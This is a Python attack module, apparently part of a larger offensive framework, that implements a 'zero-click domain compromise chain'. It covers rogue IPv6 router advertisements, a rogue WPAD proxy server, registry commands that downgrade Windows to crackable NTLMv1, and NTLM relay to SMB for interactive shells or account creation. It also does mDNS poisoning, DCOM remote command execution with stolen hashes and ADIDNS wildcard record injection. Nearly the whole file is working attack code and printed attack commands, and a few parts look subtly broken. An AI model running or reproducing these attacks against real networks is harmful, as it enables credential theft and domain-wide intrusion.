"""
Zero-interaction remote compromise — authorized penetration testing only.

Techniques that compromise hosts without any user action:

1. IPv6 Rogue RA (Router Advertisement)
   Advertise ourselves as default IPv6 router with shorter prefix lifetime
   than the legitimate router. All IPv6 traffic (and DNS) diverts to us.
   Works silently, no credentials, no CVE. Affects all unprotected networks.

2. WPAD + NTLMv1 Forced Downgrade
   Respond to WPAD broadcasts with a PAC file that routes proxy through us.
   Force NTLMv1 (via LmCompatibilityLevel attack) so the challenge response
   is crackable with a rainbow table in seconds (no GPU needed).

3. SMB Relay (NTLM relay without cracking)
   Capture NTLMv2 via LLMNR/WPAD/RA, relay immediately to SMB targets
   that have signing disabled. No password needed — directly get a shell.

4. mDNS/DNS-SD Poisoning (macOS/Linux)
   Respond to Bonjour/Avahi mDNS queries with our IP — works on Linux,
   macOS, ChromeOS. Pairs with WPAD or direct service spoofing.

5. DCOM/RPC Lateral Movement
   Use captured credentials or Kerberos ticket to instantiate DCOM objects
   remotely. No SMB required. Works through firewalls that allow RPC.

6. WebDAV Credential Capture
   Poison LLMNR/WPAD to redirect WebDAV shares — Windows auto-authenticates
   with NTLMv2 on UNC path access (\\server\share format in browser URLs).

7. ADIDNS + WPAD Wildcard (authenticated insider)
   Add wildcard DNS entry via LDAP (no special AD rights needed by default)
   to poison DNS for all internal clients simultaneously.
"""

import socket, struct, threading, time, os, sys, subprocess, base64
import http.server, select, queue, random, ipaddress

# ── Helpers ───────────────────────────────────────────────────────────────────

def _run(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return str(e)

def _iface_to_ip(iface="eth0"):
    """Get IP of local interface."""
    try:
        import fcntl, struct
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(
            fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', iface[:15].encode()))[20:24]
        )
    except:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]; s.close()
            return ip
        except: return "0.0.0.0"

captured_creds = []  # shared capture list
_running       = False

# ══════════════════════════════════════════════════════════════════════════════
# 1. IPv6 Rogue Router Advertisement
# ══════════════════════════════════════════════════════════════════════════════

def _build_router_advertisement(attacker_ipv6, dns_server_ipv6=None):
    """
    Build an ICMPv6 Router Advertisement packet.
    Sets M=0 O=1 (stateless, use our DNS), prefix with 0 lifetime to invalidate
    legitimate routes, our address as default router with high preference.
    """
    # ICMPv6 RA: type=134, code=0
    ra  = struct.pack("!BBHBBHI",
        134,          # type: Router Advertisement
        0,            # code
        0,            # checksum (filled later)
        255,          # hop limit
        0x08,         # flags: O=1 (other config — get DNS via DHCPv6)
        30,           # router lifetime (seconds) — short so we stay preferred
        0,            # reachable time
    )
    ra += struct.pack("!I", 0)  # retrans timer

    # Prefix Information option (type=3)
    # Advertise ::/0 with zero valid lifetime (deprioritize existing)
    prefix_bytes = socket.inet_pton(socket.AF_INET6, "fd00::")
    ra += struct.pack("!BBBBII",
        3,        # type: Prefix Information
        4,        # length (in 8-byte units)
        64,       # prefix length
        0xC0,     # L=1, A=1
        300,      # valid lifetime
        120,      # preferred lifetime
    )
    ra += b"\x00" * 4 + prefix_bytes  # reserved + prefix

    # Recursive DNS Server option (type=25) — point to us
    dns_v6 = dns_server_ipv6 or attacker_ipv6
    try:
        dns_bytes = socket.inet_pton(socket.AF_INET6, dns_v6)
    except:
        dns_bytes = b"\x00" * 16
    ra += struct.pack("!BBH", 25, 3, 0) + struct.pack("!I", 300) + dns_bytes

    # Source Link-Layer Address option (type=1)
    # Use our MAC (get via netifaces or just use a fake one)
    mac = bytes([0x00, 0x0c, 0x29, random.randint(0,255),
                 random.randint(0,255), random.randint(0,255)])
    ra += struct.pack("!BB", 1, 1) + mac

    return ra


def ipv6_rogue_ra(attacker_ip=None, attacker_ipv6=None, iface="eth0",
                  interval=20, duration=300):
    """
    Flood the local network with ICMPv6 Router Advertisements pointing to us.
    All hosts that accept the RA will:
    - Use us as their IPv6 default gateway
    - Use us as DNS server (if RDNSS option supported — Win/Linux/Mac all support)
    - Send all IPv6 traffic through us

    Pair with ip6tables FORWARD + scapy MitM to intercept/relay.

    attacker_ipv6: our link-local or global IPv6 (e.g. fe80::1 or fd00::1)
    duration: run for this many seconds (0 = forever)
    """
    if attacker_ipv6 is None:
        attacker_ipv6 = "fe80::1"
    if attacker_ip is None:
        attacker_ip = _iface_to_ip(iface)

    out = [f"[IPv6 RA] Sending rogue Router Advertisements on {iface}",
           f"[IPv6 RA] Attacker IPv6: {attacker_ipv6}  IPv4: {attacker_ip}",
           f"[IPv6 RA] Interval: {interval}s  Duration: {duration}s",
           "[IPv6 RA] All IPv6 hosts on LAN will route traffic through us"]

    try:
        # All-Nodes multicast: ff02::1
        ALL_NODES = "ff02::1"
        ra_pkt = _build_router_advertisement(attacker_ipv6)

        sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 255)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, iface.encode())
        except: pass

        start = time.time()
        sent  = 0
        while True:
            sock.sendto(ra_pkt, (ALL_NODES, 0))
            sent += 1
            out.append(f"  [+] RA sent #{sent} → {ALL_NODES}")
            if 0 < duration <= (time.time() - start):
                break
            time.sleep(interval)

        sock.close()
        out.append(f"[+] Sent {sent} RA packets")
        out.append(f"[*] Enable IPv4 forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward")
        out.append(f"[*] Enable IPv6 forwarding: echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")
        out.append(f"[*] MitM IPv6 traffic: ip6tables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")

    except PermissionError:
        out.append("[!] Permission denied — requires root (sudo)")
    except Exception as e:
        out.append(f"[!] Error: {e}")

    return "\n".join(out)


# ══════════════════════════════════════════════════════════════════════════════
# 2. WPAD + NTLMv1 Forced Downgrade
# ══════════════════════════════════════════════════════════════════════════════

WPAD_PAC = """function FindProxyForURL(url, host) {{
    if (shExpMatch(url, "http://*")) return "PROXY {attacker_ip}:{proxy_port}";
    return "DIRECT";
}}"""

NTLMV1_REG_KEYS = [
    # Downgrade Windows to NTLMv1 (crackable with rainbow tables)
    r"reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel /t REG_DWORD /d 1 /f",
    r"reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v NtlmMinClientSec /t REG_DWORD /d 0 /f",
    r"reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v NtlmMinServerSec /t REG_DWORD /d 0 /f",
    r"reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d 0 /f",
]


class _WPADHandler(http.server.BaseHTTPRequestHandler):
    attacker_ip  = "127.0.0.1"
    proxy_port   = 8080

    def do_GET(self):
        if self.path in ("/wpad.dat", "/wpad/wpad.dat", "/proxy.pac"):
            pac = WPAD_PAC.format(
                attacker_ip=self._WPADHandler__class__.attacker_ip if hasattr(self, "__class__") else self.attacker_ip,
                proxy_port=self.proxy_port
            )
            pac = WPAD_PAC.format(attacker_ip=self.server.attacker_ip,
                                  proxy_port=self.server.proxy_port)
            body = pac.encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/x-ns-proxy-autoconfig")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            print(f"  [WPAD] Served PAC to {self.client_address[0]}")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args): pass


def wpad_ntlmv1_downgrade(attacker_ip=None, proxy_port=8080, wpad_port=80,
                          ntlmrelay=True):
    """
    Start a WPAD server that serves a PAC file routing all HTTP through our proxy.
    When victim browsers auto-discover WPAD, they send NTLM auth to us.
    Combined with NTLMv1 downgrade (set via registry on compromised hosts or
    forced via NTLM challenge flags), hashes are crackable instantly.

    ntlmrelay: if True, relay captured hashes to SMB targets via ntlmrelayx.
    """
    if attacker_ip is None:
        attacker_ip = _iface_to_ip()

    out = [f"[WPAD] Starting rogue WPAD server on {attacker_ip}:{wpad_port}",
           f"[WPAD] PAC file: PROXY {attacker_ip}:{proxy_port}",
           f"[WPAD] Victims will auto-discover via broadcast WPAD name resolution"]

    # Start WPAD HTTP server
    try:
        srv = http.server.HTTPServer(("0.0.0.0", wpad_port), _WPADHandler)
        srv.attacker_ip = attacker_ip
        srv.proxy_port  = proxy_port
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        out.append(f"[+] WPAD server listening on :{wpad_port}")
    except Exception as e:
        out.append(f"[!] WPAD server start failed: {e}")

    # Print NTLMv1 downgrade instructions
    out.append(f"\n[WPAD] NTLMv1 downgrade registry keys (run on any compromised host in domain):")
    for cmd in NTLMV1_REG_KEYS:
        out.append(f"  {cmd}")
    out.append(f"\n[*] Once NTLMv1 is forced: captured hashes are crackable in <1s with:")
    out.append(f"    hashcat -m 5500 ntlmv1.txt ntlm_tables/ --table-file NTLM_FULL_8.table")
    out.append(f"    Or: https://crack.sh (free online NTLMv1 cracker)")

    # NTLMv1 forced downgrade via Responder
    if ntlmrelay:
        out.append(f"\n[*] SMB relay (no cracking needed on signing-disabled targets):")
        out.append(f"    ntlmrelayx.py -tf smb_targets.txt -smb2support --no-http-server")
        out.append(f"    # smb_targets.txt = hosts with SMB signing disabled")
        out.append(f"    # Find them: crackmapexec smb <subnet> --gen-relay-list targets.txt")

    out.append(f"\n[WPAD] Force WPAD discovery on all domain hosts via ADIDNS wildcard:")
    out.append(f"    Invoke-DNSUpdate -DNSName wpad -DNSData {attacker_ip} -Realm CORP.LOCAL")
    out.append(f"    # (requires only Domain User — ADIDNS allows this by default)")

    return "\n".join(out)


# ══════════════════════════════════════════════════════════════════════════════
# 3. SMB Relay — direct shell without cracking
# ══════════════════════════════════════════════════════════════════════════════

def smb_relay(targets_file=None, targets=None, lhost=None,
              lport=4460, add_user=False, exec_cmd=None):
    """
    NTLM relay attack: capture NTLM auth from LLMNR/WPAD poisoning,
    relay directly to SMB hosts without signing enabled.
    No password cracking required — relay the captured challenge in real-time.

    Requires: impacket ntlmrelayx.py
    Pair with: start llmnr (for LLMNR/NBT-NS capture) or wpad_ntlmv1_downgrade

    targets: list of IPs, or targets_file with one IP per line
    """
    import shutil

    out = [f"[SMB Relay] NTLM relay attack"]

    # Find signing-disabled targets
    if targets:
        tgts = targets
    else:
        # Auto-scan with crackmapexec
        scanner = shutil.which("crackmapexec") or shutil.which("cme")
        if scanner and lhost:
            subnet = ".".join(lhost.split(".")[:3]) + ".0/24"
            out.append(f"[*] Scanning {subnet} for SMB signing disabled...")
            scan_out = _run(
                f"crackmapexec smb {subnet} --gen-relay-list /tmp/relay_targets.txt 2>/dev/null",
                timeout=120
            )
            out.append(scan_out[:500])
            targets_file = "/tmp/relay_targets.txt"
        tgts = []

    if targets_file and os.path.exists(targets_file):
        out.append(f"[+] Relay targets file: {targets_file}")
    elif tgts:
        targets_file = "/tmp/relay_targets.txt"
        with open(targets_file, "w") as f:
            f.write("\n".join(tgts))
        out.append(f"[+] Relay targets ({len(tgts)}): {', '.join(tgts[:5])}")
    else:
        out.append("[!] No targets file — provide targets or auto-scan subnet")
        targets_file = "/tmp/relay_targets.txt"

    # Build ntlmrelayx command
    ntlmrelay = shutil.which("ntlmrelayx.py") or shutil.which("ntlmrelayx")
    if not ntlmrelay:
        # Check impacket install location
        for path in ["/usr/local/bin/ntlmrelayx.py",
                     "/opt/impacket/examples/ntlmrelayx.py",
                     f"{os.path.expanduser('~')}/.local/bin/ntlmrelayx.py"]:
            if os.path.exists(path):
                ntlmrelay = f"python3 {path}"
                break

    if not ntlmrelay:
        out.append("[!] ntlmrelayx not found — install: pip install impacket")
        out.append(f"\n[*] Manual command when installed:")
        cmd_parts = [
            f"ntlmrelayx.py",
            f"-tf {targets_file}",
            f"-smb2support",
            f"--no-http-server",
        ]
        if lhost and lport:
            cmd_parts.append(f"-i")  # interactive shell mode
        if add_user:
            cmd_parts.append(f"--add-computer WiZZA$ WiZZA@2024!")
        if exec_cmd:
            cmd_parts.extend(["-c", f'"{exec_cmd}"'])
        out.append(f"    {' '.join(cmd_parts)}")
        return "\n".join(out)

    # Build and launch ntlmrelayx
    cmd = f"{ntlmrelay} -tf {targets_file} -smb2support --no-http-server"
    if exec_cmd:
        cmd += f" -c \"{exec_cmd}\""
    elif add_user:
        cmd += " --add-computer WiZZA$ WiZZA@2024!"
    else:
        cmd += " -i"  # interactive shell

    out.append(f"[*] Launching: {cmd}")
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, text=True)
    out.append(f"[+] ntlmrelayx PID: {proc.pid}")
    out.append(f"[*] Waiting for relayed connections...")
    out.append(f"[*] Connect to shells: nc localhost 11000 (first relay), 11001, etc.")
    out.append(f"\n[*] How to feed it hashes:")
    out.append(f"    - start llmnr start   (LLMNR/NBT-NS poisoning)")
    out.append(f"    - wpad_ntlmv1_downgrade()  (WPAD auto-auth)")
    out.append(f"    - IPv6 RA → DNS redirect → ntlmrelayx HTTP listener")

    # Read initial output
    try:
        import select as _sel
        fds = [proc.stdout, proc.stderr]
        ready, _, _ = _sel.select(fds, [], [], 5)
        for fd in ready:
            line = fd.readline()
            if line: out.append(f"  {line.rstrip()}")
    except: pass

    return "\n".join(out)


# ══════════════════════════════════════════════════════════════════════════════
# 4. mDNS/DNS-SD Poisoning (macOS, Linux, ChromeOS)
# ══════════════════════════════════════════════════════════════════════════════

MDNS_PORT  = 5353
MDNS_MCAST = "224.0.0.251"

def _build_mdns_response(query_name, attacker_ip, tid=0):
    """Build mDNS A record response for query_name → attacker_ip."""
    def _encode_name(name):
        enc = b""
        for part in name.split("."):
            enc += struct.pack("B", len(part)) + part.encode()
        return enc + b"\x00"

    flags   = 0x8400   # QR=1 AA=1
    resp    = struct.pack(">HHHHHH", tid, flags, 1, 1, 0, 0)
    resp   += _encode_name(query_name) + struct.pack(">HH", 1, 1)  # QTYPE A, QCLASS IN
    resp   += _encode_name(query_name) + struct.pack(">HHIH", 1, 1, 30, 4)
    resp   += socket.inet_aton(attacker_ip)
    return resp


def mdns_poison(attacker_ip=None, target_names=None, duration=300):
    """
    Poison mDNS queries for target_names with attacker_ip.
    Affects all macOS, Linux (Avahi), ChromeOS, Android devices on the LAN.
    Responds to ANY query if target_names is None (universal poisoning).

    Use to redirect:
    - Any .local name: redirect to our HTTP/SMB server
    - printer.local, nas.local, router.local: common targets
    """
    if attacker_ip is None:
        attacker_ip = _iface_to_ip()

    out = [f"[mDNS] Poisoning on {attacker_ip}, duration={duration}s"]
    if target_names:
        out.append(f"[mDNS] Target names: {', '.join(target_names)}")
    else:
        out.append("[mDNS] Universal mode — responding to ALL .local queries")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try: sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        except: pass
        sock.bind(("", MDNS_PORT))
        mreq = socket.inet_aton(MDNS_MCAST) + socket.inet_aton("0.0.0.0")
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        sock.settimeout(1)

        start   = time.time()
        poisoned = 0
        while True:
            try:
                data, addr = sock.recvfrom(512)
                if len(data) < 12: continue
                flags = struct.unpack_from(">H", data, 2)[0]
                if flags & 0x8000: continue  # response, skip

                # Parse query name
                offset  = 12
                name    = ""
                while offset < len(data) and data[offset]:
                    llen = data[offset]; offset += 1
                    name += data[offset:offset+llen].decode(errors="replace") + "."
                    offset += llen
                name = name.rstrip(".")

                if (target_names is None or
                    any(t.lower() in name.lower() for t in (target_names or []))):
                    tid = struct.unpack_from(">H", data, 0)[0]
                    resp = _build_mdns_response(name, attacker_ip, tid)
                    sock.sendto(resp, (MDNS_MCAST, MDNS_PORT))
                    poisoned += 1
                    out.append(f"  [+] Poisoned mDNS: {name} → {attacker_ip} (from {addr[0]})")

            except socket.timeout:
                pass
            except Exception as e:
                out.append(f"  [!] {e}")

            if 0 < duration <= (time.time() - start):
                break

        sock.close()
        out.append(f"[+] Poisoned {poisoned} mDNS queries")

    except PermissionError:
        out.append("[!] Permission denied — requires root")
    except Exception as e:
        out.append(f"[!] mDNS error: {e}")

    return "\n".join(out)


# ══════════════════════════════════════════════════════════════════════════════
# 5. DCOM lateral movement (no SMB required)
# ══════════════════════════════════════════════════════════════════════════════

def dcom_exec(target_ip, domain, user, password=None, ntlm_hash=None, cmd="whoami"):
    """
    Execute command on remote host via DCOM (MMC20.Application or ShellWindows).
    Does not require SMB port 445 — uses RPC port 135 + dynamic high port.
    Works even when SMB is firewalled.

    Uses impacket dcomexec.py.
    """
    import shutil
    out = [f"[DCOM] Target: {target_ip}  User: {domain}\\{user}  cmd: {cmd}"]

    dcom = None
    for path in [shutil.which("dcomexec.py"), shutil.which("dcomexec"),
                 "/usr/local/bin/dcomexec.py",
                 "/opt/impacket/examples/dcomexec.py"]:
        if path and os.path.exists(path):
            dcom = path
            break

    if not dcom:
        out.append("[!] dcomexec.py not found — install impacket: pip install impacket")
        out.append(f"[*] Manual: dcomexec.py -object MMC20 '{domain}/{user}:{password}'@{target_ip} '{cmd}'")
        return "\n".join(out)

    auth = f"'{domain}/{user}"
    if ntlm_hash:
        auth += f"' -hashes :{ntlm_hash}"
        auth_end = ""
    else:
        auth += f":{password}'"
        auth_end = ""

    cmd_str = (f"python3 {dcom} -object MMC20 {auth}{auth_end} "
               f"@{target_ip} '{cmd}'")
    out.append(f"[*] Executing: {cmd_str}")
    result = _run(cmd_str, timeout=60)
    out.append(result[:2000])

    if not result or "error" in result.lower():
        # Try ShellWindows object
        cmd_str2 = cmd_str.replace("MMC20", "ShellWindows")
        out.append(f"[*] Retrying with ShellWindows...")
        result2 = _run(cmd_str2, timeout=60)
        out.append(result2[:1000])

    return "\n".join(out)


# ══════════════════════════════════════════════════════════════════════════════
# 6. ADIDNS Wildcard Poisoning (authenticated, no special rights needed)
# ══════════════════════════════════════════════════════════════════════════════

def adidns_wildcard(dc_ip, domain, user, password, attacker_ip,
                    record_name="*"):
    """
    Add a wildcard DNS record to Active Directory Integrated DNS.
    By default, any Domain User can add DNS records in AD via LDAP.
    Once added, ALL DNS lookups for non-existent names resolve to attacker_ip.
    This poisons ALL internal hosts simultaneously — no per-host poisoning needed.

    Combined with SMB relay: instant domain-wide credential capture.

    Uses: dnstool.py from krbrelayx (dirkjanm) or dnspython + ldap3
    """
    import shutil
    out = [f"[ADIDNS] Adding wildcard DNS: {record_name} → {attacker_ip}",
           f"[ADIDNS] DC: {dc_ip}  Domain: {domain}  User: {user}"]

    # Try krbrelayx dnstool
    dnstool = shutil.which("dnstool.py")
    if not dnstool:
        for p in ["/opt/krbrelayx/dnstool.py",
                  "/usr/share/krbrelayx/dnstool.py"]:
            if os.path.exists(p):
                dnstool = p; break

    if dnstool:
        cmd = (f"python3 {dnstool} -u '{domain}\\{user}' -p '{password}' "
               f"-r '{record_name}' -d {attacker_ip} --action add {dc_ip}")
        out.append(f"[*] Running: {cmd}")
        result = _run(cmd, timeout=30)
        out.append(result)
    else:
        # Fall back to pure ldap3 implementation
        out.append("[*] dnstool.py not found — trying ldap3 direct LDAP...")
        try:
            import ldap3
            srv = ldap3.Server(dc_ip, get_info=ldap3.ALL)
            conn = ldap3.Connection(srv, user=f"{domain}\\{user}",
                                    password=password, authentication=ldap3.NTLM)
            conn.bind()

            # Build DNS record attribute (dnsRecord)
            # Type A record, 4-byte IP
            ip_bytes = socket.inet_aton(attacker_ip)
            # DNS record format: DataLength(2), Type(2), Version(1), Rank(1), Flags(2),
            # Serial(4), TtlSeconds(4), Reserved(4), TombstoneTime(8), Data
            dns_rec = struct.pack(">HHHBBHIIII",
                4,        # DataLength (A record = 4 bytes)
                1,        # Type: A
                5,        # Version
                0xF0,     # Rank: DNS_RANK_ZONE
                0, 0,     # Flags, Serial
                0, 600,   # serial, TTL
                0, 0      # reserved x2
            ) + ip_bytes

            # Build distinguished name
            zone = domain.lower()
            dn = (f"DC={record_name},DC={zone},"
                  f"CN=MicrosoftDNS,DC=DomainDnsZones,"
                  + ",".join(f"DC={p}" for p in zone.split(".")))

            attrs = {
                "objectClass": ["top", "dnsNode"],
                "dnsRecord": [dns_rec],
                "dNSTombstoned": [False],
            }
            result = conn.add(dn, attributes=attrs)
            if result or conn.result["description"] == "success":
                out.append(f"[+] Wildcard DNS record added: {record_name} → {attacker_ip}")
                out.append(f"[+] ALL unresolved DNS lookups in {domain} now point to us")
                out.append(f"\n[*] This silently captures authentication from all domain hosts!")
                out.append(f"[*] Pair with: ntlmrelayx, WPAD, SMB relay")
            else:
                out.append(f"[!] LDAP add failed: {conn.result}")
            conn.unbind()
        except ImportError:
            out.append("[!] ldap3 not installed: pip install ldap3")
            out.append(f"\n[*] Manual PowerShell (run as domain user):")
            out.append(f"    Invoke-DNSUpdate -DNSName {record_name} -DNSData {attacker_ip} -Realm {domain}")
        except Exception as e:
            out.append(f"[!] LDAP error: {e}")

    out.append(f"\n[*] Remove when done:")
    out.append(f"    python3 {dnstool or 'dnstool.py'} -u '{domain}\\{user}' -p '{password}' "
               f"-r '{record_name}' --action del {dc_ip}")
    return "\n".join(out)


# ══════════════════════════════════════════════════════════════════════════════
# Full zero-click chain orchestrator
# ══════════════════════════════════════════════════════════════════════════════

def zero_click_chain(attacker_ip, dc_ip=None, domain=None,
                     user=None, password=None, iface="eth0"):
    """
    Launch all passive zero-interaction attack layers simultaneously.
    No user clicks required on any victim machine.

    Layer 1: IPv6 RA flooding (all IPv6 hosts route through us)
    Layer 2: mDNS poisoning (all .local names → us)
    Layer 3: LLMNR/NBT-NS poisoning (via llmnr_poison.py)
    Layer 4: WPAD server + NTLMv1 downgrade guidance
    Layer 5 (optional): ADIDNS wildcard (if domain creds available)
    """
    out = ["=" * 60,
           " ZERO-CLICK DOMAIN COMPROMISE CHAIN",
           f" Attacker: {attacker_ip}  Interface: {iface}",
           "=" * 60]

    threads = []

    # Layer 1: IPv6 RA
    def _ra():
        try:
            r = ipv6_rogue_ra(attacker_ip=attacker_ip, iface=iface,
                               interval=20, duration=0)
            print(f"[RA] {r[:100]}")
        except: pass
    threads.append(threading.Thread(target=_ra, daemon=True, name="IPv6-RA"))

    # Layer 2: mDNS
    def _mdns():
        try:
            r = mdns_poison(attacker_ip=attacker_ip, duration=0)
            print(f"[mDNS] {r[:100]}")
        except: pass
    threads.append(threading.Thread(target=_mdns, daemon=True, name="mDNS"))

    # Layer 3: LLMNR via llmnr_poison module
    def _llmnr():
        try:
            sys.path.insert(0, os.path.join(os.path.dirname(__file__)))
            from llmnr_poison import start as llmnr_start
            llmnr_start(attacker_ip)
        except Exception as e:
            print(f"[LLMNR] {e}")
    threads.append(threading.Thread(target=_llmnr, daemon=True, name="LLMNR"))

    # Layer 4: WPAD
    def _wpad():
        try:
            wpad_ntlmv1_downgrade(attacker_ip=attacker_ip)
        except: pass
    threads.append(threading.Thread(target=_wpad, daemon=True, name="WPAD"))

    for t in threads:
        t.start()
        time.sleep(0.2)
        out.append(f"[+] Started: {t.name}")

    # Layer 5: ADIDNS wildcard (if creds provided)
    if all([dc_ip, domain, user, password]):
        out.append("\n[*] Adding ADIDNS wildcard DNS record...")
        r = adidns_wildcard(dc_ip, domain, user, password, attacker_ip)
        out.append(r)

    out.append(f"\n[*] All zero-click layers running.")
    out.append(f"[*] Captured hashes: from llmnr_poison → get_hashes()")
    out.append(f"[*] Relay to SMB:    smb_relay(targets=[...])")
    out.append(f"[*] Stop all:        set _running=False + restart agent")

    return "\n".join(out)


# ── Dispatch ──────────────────────────────────────────────────────────────────

def run(action, **kwargs):
    dispatch = {
        "ipv6_ra":         ipv6_rogue_ra,
        "wpad":            wpad_ntlmv1_downgrade,
        "smb_relay":       smb_relay,
        "mdns":            mdns_poison,
        "dcom":            dcom_exec,
        "adidns":          adidns_wildcard,
        "chain":           zero_click_chain,
    }
    fn = dispatch.get(action)
    if not fn:
        return (f"Unknown action: {action}\n"
                f"Available: {', '.join(dispatch.keys())}")
    return fn(**kwargs)
